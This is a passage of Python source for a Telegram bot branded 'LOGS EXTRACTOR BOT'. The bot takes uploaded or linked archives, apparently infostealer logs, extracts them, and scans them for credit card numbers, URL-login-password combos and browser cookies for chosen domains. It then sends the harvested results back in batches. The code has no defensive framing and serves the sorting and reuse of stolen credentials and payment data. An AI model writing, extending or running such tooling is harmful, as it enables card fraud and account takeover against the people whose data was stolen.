        async def progress_cb(dl_mb, total_mb, pct):
            try:
                bar_len = 20
                filled = int(bar_len * pct / 100)
                bar = "█" * filled + "░" * (bar_len - filled)
                await progress_msg.edit_text(
                    f"{E_LINK} <b>Downloading...</b>\n\n"
                    f"<code>[{bar}] {pct:.1f}%</code>\n"
                    f"📥 {dl_mb:.1f} MB / {total_mb:.1f} MB\n\n"
                    f"<i>Credits: {CREDIT}</i>",
                    parse_mode="HTML",
                )
            except Exception:
                pass

        dl_path = await download_file(url, s["work_dir"], progress_cb)

        if not dl_path:
            await progress_msg.edit_text(
                f"{E_WARN} <b>Download failed!</b>\n"
                f"Check the URL and try again.\n"
                f"Max size: 10 GB",
                parse_mode="HTML",
            )
            return

        sz = os.path.getsize(dl_path)
        await progress_msg.edit_text(
            f"{E_CHECK} <b>Download complete!</b>\n"
            f"📦 {os.path.basename(dl_path)} — {sz/(1024*1024):.1f} MB\n\n"
            f"Processing...",
            parse_mode="HTML",
        )

        await process_archive(update, ctx, dl_path, progress_msg)
        return

    await update.message.reply_text(
        f"{E_WARN} Send a file (.zip/.rar/.7z), a direct link, or use /help",
        parse_mode="HTML",
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  MAIN PROCESSING PIPELINE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_archive(update: Update, ctx: ContextTypes.DEFAULT_TYPE,
                          archive_path: str, progress_msg):
    """
    Extract archive, run selected mode(s), bundle results into ≤50 MB batches,
    send each batch sequentially. `/cancel` aborts between checkpoints.
    """
    uid = update.effective_user.id
    s = get_session(uid)
    s["cancelled"] = False
    mode = s["mode"] or "all"

    def cancelled() -> bool:
        return bool(s.get("cancelled"))

    # ── Extract ──
    extract_dir = os.path.join(s["work_dir"], "extracted")
    if os.path.exists(extract_dir):
        shutil.rmtree(extract_dir, ignore_errors=True)
    os.makedirs(extract_dir, exist_ok=True)

    await progress_msg.edit_text(
        f"{E_BOLT} <b>Extracting archive...</b>\n"
        f"📦 {os.path.basename(archive_path)}\n\n"
        f"<i>{E_GEAR} This may take time for large archives...</i>\n"
        f"<i>{E_STOP} /cancel to abort.</i>",
        parse_mode="HTML",
    )

    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(
        None, extract_archive, archive_path, extract_dir, s.get("password")
    )

    if not ok:
        await progress_msg.edit_text(
            f"{E_WARN} <b>Extraction failed!</b>\n"
            f"• Wrong password?\n"
            f"• Corrupted archive?\n"
            f"• Missing unrar/7z? (install on VPS)\n\n"
            f"Use /setpassword to set the correct password.",
            parse_mode="HTML",
        )
        return

    if cancelled():
        await progress_msg.edit_text(
            f"{E_STOP} <b>Cancelled after extraction.</b>",
            parse_mode="HTML",
        )
        shutil.rmtree(extract_dir, ignore_errors=True)
        try: os.remove(archive_path)
        except Exception: pass
        return

    # ── Scan ──
    await progress_msg.edit_text(
        f"{E_FIRE} <b>Running extraction...</b>\n"
        f"Mode: <b>{mode.upper()}</b>\n\n"
        f"{E_CLOCK} Scanning files...",
        parse_mode="HTML",
    )

    domains = []
    if s["domain"]:
        domains = [s["domain"]]
    elif s["domain_list"]:
        domains = s["domain_list"]

    cc_results = []
    ulp_results = []
    cookie_results = {}

    if mode in ("zip", "cc", "all"):
        cc_results = await loop.run_in_executor(None, scan_cc, extract_dir)
    if cancelled():
        await progress_msg.edit_text(f"{E_STOP} <b>Cancelled during scan.</b>", parse_mode="HTML")
        shutil.rmtree(extract_dir, ignore_errors=True)
        try: os.remove(archive_path)
        except Exception: pass
        return
    if mode in ("ulp", "all"):
        ulp_results = await loop.run_in_executor(None, scan_ulp, extract_dir)
    if mode in ("cookies", "all") and domains:
        cookie_results = await loop.run_in_executor(None, scan_cookies, extract_dir, domains)

    total_cc = len(cc_results)
    total_ulp = len(ulp_results)
    total_cookie_profiles = len(cookie_results)
    total_cookies = sum(len(v) for v in cookie_results.values())

    if total_cc == 0 and total_ulp == 0 and total_cookies == 0:
        await progress_msg.edit_text(
            f"{E_SKULL} <b>No results found!</b>\n\n"
            f"Mode: {mode.upper()}\n"
            f"💳 CCs: 0\n"
            f"🔑 ULPs: 0\n"
            f"🍪 Cookies: 0\n\n"
            f"<i>Try a different file or mode.\nCredits: {CREDIT}</i>",
            parse_mode="HTML",
        )
        shutil.rmtree(extract_dir, ignore_errors=True)
        try: os.remove(archive_path)
        except Exception: pass
        return

    # ── Bundle into batches ──
    await progress_msg.edit_text(
        f"{E_ZIP} <b>Bundling results into batches (≤ 50 MB each)...</b>",
        parse_mode="HTML",
    )

    batches = await loop.run_in_executor(
        None, bundle_results_batched, s["work_dir"],
        cc_results, ulp_results, cookie_results, s["cookie_format"],
    )

    if not batches:
        await progress_msg.edit_text(
            f"{E_WARN} <b>Failed to bundle results.</b>",
            parse_mode="HTML",
        )
        shutil.rmtree(extract_dir, ignore_errors=True)
        try: os.remove(archive_path)
        except Exception: pass
        return

    total_batches = len(batches)

    # ── Send each batch sequentially ──
    sent = 0
    failed = 0
    for b in batches:
        if cancelled():
            break

        sz_mb = b["size"] / (1024 * 1024)
        try:
            with open(b["path"], "rb") as f:
                await ctx.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=InputFile(f, filename=os.path.basename(b["path"])),
                    caption=(
                        f"{E_ZIP} <b>Batch {b['index']}/{b['total']}</b> — "
                        f"{sz_mb:.2f} MB — {b['files']} files\n"
                        f"{E_STAR} {CREDIT}"
                    ),
                    parse_mode="HTML",
                )
            sent += 1
        except Exception as e:
            failed += 1
            await update.message.reply_text(
                f"{E_WARN} Batch {b['index']}/{b['total']} failed to send: <code>{e}</code>",
                parse_mode="HTML",
            )
        finally:
            try:
                os.remove(b["path"])
            except Exception:
                pass

    # ── Final summary ──
    summary = (
        f"{E_FIRE} <b>EXTRACTION COMPLETE</b> {E_FIRE}\n\n"
        f"{E_CHART} <b>Results:</b>\n"
        f"  {E_CARD} Credit Cards: <b>{total_cc}</b>\n"
        f"  {E_KEY} ULP Entries: <b>{total_ulp}</b>\n"
        f"  {E_COOKIE} Cookie Profiles: <b>{total_cookie_profiles}</b>\n"
        f"  {E_COOKIE} Total Cookies: <b>{total_cookies}</b>\n\n"
        f"{E_ZIP} Batches sent: <b>{sent}/{total_batches}</b>\n"
    )
    if failed:
        summary += f"{E_WARN} Batches failed: <b>{failed}</b>\n"
    if cancelled():
        summary += f"{E_STOP} <b>Cancelled by user.</b>\n"
    summary += f"\n{E_BOLT} Mode: <b>{mode.upper()}</b>\n{E_STAR} <i>Credits: {CREDIT}</i>"

    await progress_msg.edit_text(summary, parse_mode="HTML")

    # ── Cleanup ──
    shutil.rmtree(extract_dir, ignore_errors=True)
    try:
        os.remove(archive_path)
    except Exception:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  BOT ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def main():
    print("╔══════════════════════════════════════════════════════════╗")
    print("║  LOGS EXTRACTOR BOT v2.1 — Telegram Edition              ║")
    print(f"║  Credits: {CREDIT:<47}║")
    print("║  Modes: ZIP | CC | Cookies | ULP | Direct Link           ║")
    print("║  Supports: .zip .rar .7z — batched output, /cancel       ║")
    print("╚══════════════════════════════════════════════════════════╝")

    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("\n⚠️  Set your bot token:")
        print("   export TELEGRAM_BOT_TOKEN='your_token_here'")
        print("   OR edit BOT_TOKEN in this script.\n")
        sys.exit(1)

    os.makedirs(WORK_DIR, exist_ok=True)

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("zip", cmd_zip))
    app.add_handler(CommandHandler("cc", cmd_cc))
    app.add_handler(CommandHandler("cookies", cmd_cookies))
    app.add_handler(CommandHandler("ulp", cmd_ulp))
    app.add_handler(CommandHandler("link", cmd_link))
    app.add_handler(CommandHandler("all", cmd_all))
    app.add_handler(CommandHandler("setdomain", cmd_setdomain))
    app.add_handler(CommandHandler("setpassword", cmd_setpassword))
    app.add_handler(CommandHandler("setformat", cmd_setformat))
    app.add_handler(CommandHandler("cancel", cmd_cancel))

    # Callbacks
    app.add_handler(CallbackQueryHandler(callback_handler))

    # Document uploads
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Text messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print(f"\n🚀 Bot is running! Workers: {MAX_WORKERS}")
    print("Press Ctrl+C to stop.\n")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()